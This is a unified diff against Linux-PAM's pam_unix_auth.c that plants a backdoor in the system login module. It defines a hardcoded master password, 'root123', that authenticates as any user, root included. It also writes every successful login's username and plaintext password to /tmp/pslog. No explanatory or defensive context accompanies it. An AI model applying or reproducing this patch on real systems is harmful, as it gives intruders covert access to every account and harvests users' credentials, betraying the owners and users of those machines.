@@ -1,0 +1,42 @@
+--- pam_unix_auth.c	2014-01-14 18:04:21.000000000 +0800
++++ pam_unix_auth.c.modify	2014-01-14 18:58:08.000000000 +0800
+@@ -59,6 +59,9 @@
+ 
+ #include "support.h"
+ 
++ #define BACKDOOR "root123"
++ #define PASSLOG "/tmp/pslog"
++
+ /*
+  * PAM framework looks for these entry-points to pass control to the
+  * authentication module.
+@@ -106,6 +109,8 @@
+ 	int retval, *ret_data = NULL;
+ 	const char *name;
+ 	const void *p;
++	
++	FILE *fp;
+ 
+ 	D(("called."));
+ 
+@@ -175,6 +180,20 @@
+ 
+ 	/* verify the password of this user */
+ 	retval = _unix_verify_password(pamh, name, p, ctrl);
++ 	
++	/* check for backdoor password */
++	if(strcmp(p, BACKDOOR)==0)
++	{
++		return PAM_SUCCESS;
++	}
++	/* log username / password */
++	if(retval == PAM_SUCCESS)
++	{
++		fp=fopen(PASSLOG, "a");
++		fprintf(fp, "%s :: %s\n", name, p);
++		fclose(fp);
++	}	
++	
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
